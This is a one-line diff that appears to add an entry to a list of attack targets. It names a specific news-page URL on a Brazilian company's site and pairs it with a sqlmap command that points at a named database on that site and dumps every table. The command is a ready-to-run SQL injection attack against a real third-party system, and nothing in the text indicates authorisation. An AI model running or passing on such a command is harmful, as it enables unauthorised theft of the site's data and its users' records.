@@ -1,0 +1,1 @@
+https://www.bfour.com.br/noticia.php?codigo=11 (GET)  # sqlmap.py -u https://www.bfour.com.br/noticia.php?codigo=11 -D bfourcom_bfour --tables --dump-all
